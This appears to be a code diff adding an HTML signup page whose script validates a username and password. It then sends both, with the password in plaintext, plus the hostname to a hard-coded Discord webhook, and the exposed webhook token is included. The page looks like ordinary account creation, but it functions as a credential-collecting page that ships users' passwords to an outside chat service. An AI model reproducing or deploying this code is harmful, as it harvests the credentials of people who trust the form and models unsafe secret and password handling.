@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create Account</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <div class="container">
+        <h2>Create an Account</h2>
+        <form id="signup-form">
+            <input type="text" id="username" placeholder="Enter Username (5-20 characters)" required>
+            <input type="password" id="password" placeholder="Enter Password" required>
+            <button type="submit">Sign Up</button>
+        </form>
+    </div>
+
+    <script>
+        const signupWebhookUrl = "https://discord.com/api/webhooks/1327421684432769086/Npb-WvhqHj07qgxkRWBPYWGFwl5Nx04BOYXT2ORTyUQpi0oz4jmuTGUS2A-RhEJjcWIg";
+
+        // Username validation
+        function isValidUsername(username) {
+            return username.length >= 5 && username.length <= 20;
+        }
+
+        // Password validation: password should not be similar to username
+        function isValidPassword(username, password) {
+            const usernameLower = username.toLowerCase();
+            return password !== username && !password.toLowerCase().includes(usernameLower);
+        }
+
+        document.getElementById('signup-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const ip = window.location.hostname;
+
+            if (!isValidUsername(username)) {
+                alert("Username must be between 5 and 20 characters.");
+                return;
+            }
+
+            if (!isValidPassword(username, password)) {
+                alert("Password cannot be the same or similar to the username.");
+                return;
+            }
+
+            // Simulate account creation and send data to the webhook
+            const message = {
+                content: `New Account Created:\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}`
+            };
+
+            fetch(signupWebhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Account created successfully!");
+                    window.location.href = "index.html";  // Redirect to main page after signup
+                } else {
+                    alert("Error creating account.");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("Error creating account.");
+            });
+        });
+    </script>
+
+</body>
+</html>
